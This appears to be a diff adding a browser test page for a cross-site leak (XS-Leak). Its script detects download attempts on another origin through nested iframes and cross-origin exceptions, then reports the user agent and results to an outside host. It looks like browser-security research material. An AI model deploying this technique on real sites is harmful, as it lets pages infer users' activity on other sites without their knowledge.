@@ -1,0 +1,43 @@
+<script>
+    window.onload = function () {
+        var results = [];
+        var iframe = document.createElement('iframe');
+        document.body.appendChild(iframe);
+
+        function run(url) {
+            // Create an inner iframe to test for the download attempt
+            iframe.srcdoc = "<iframe src='" + url + "'></iframe>";
+
+            iframe.onload = function () {
+                try {
+                    // If a navigation occurs, the iframe will be cross-origin,
+                    // so accessing "inner.origin" will throw an exception
+                    iframe.contentWindow.frames[0].origin;
+                    console.log('Download attempt detected');
+                    results.push("detected");
+                } catch (e) {
+                    console.log('No download attempt detected');
+                    results.push("not_detected");
+                }
+            };
+        }
+
+        run('https://leak.test/');
+        setTimeout(function () {
+            run('https://leak.test/download/');
+        }, 2000);
+
+        function report() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://re.port/case7.json/" + btoa(JSON.stringify({
+                "user-agent": navigator.userAgent,
+                "without_download_bar": results[0],
+                "with_download_bar": results[1],
+                "xsleak_reproduced": results[0] === "not_detected" && results[1] === "detected"
+            })));
+            xhr.send();
+        }
+
+        setTimeout(report, 6000);
+    };
+</script>
